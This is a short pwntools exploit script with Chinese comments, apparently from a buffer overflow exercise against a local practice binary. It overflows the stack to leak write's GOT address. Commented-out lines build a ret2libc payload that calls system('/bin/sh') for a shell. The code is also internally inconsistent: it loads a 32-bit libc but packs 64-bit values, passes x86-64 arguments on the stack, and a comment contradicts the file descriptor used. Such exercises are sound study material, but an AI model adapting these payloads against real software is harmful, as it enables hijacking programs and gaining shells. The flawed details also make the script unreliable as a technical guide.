from pwn import *

io = process('../target/nopie.out')

elf = ELF('../target/nopie.out')

libc = ELF('/lib/i386-linux-gnu/libc.so.6')

# 反编译得知
vuln_func = 0x401142

# 这边溢出return_address 变为write 返回地址变为vuln_func 然后继续溢出做write的arg 就是0 stdout wirte的got 然后写入8字节
# 此处可以这么理解溢出后vuln返回实际做的操作pop localvar 然后pop rbp 恢复callers rbp但是此处应该是被污染了 然后pop rip 就是将write给了rip 
# 此时系统默认当前栈是write的caller
payload1 = b'A'*120+p64(elf.sym['write'])+p64(vuln_func)+p64(1)+p64(elf.got['write'])+p64(8)

io.send(payload1)

# write_addr = u64(io.recv(8))
print(io.recv(8))
# system_addr = write_addr-libc.sym['write']+libc.sym['system']
# binsh_addr = write_addr-libc.sym['write']+next(libc.search('/bin/sh'))
# payload2 = b'B'*120+p64(system_addr)+p64(vuln_func)+p64(binsh_addr)

# io.send(payload2)
# io.interactive()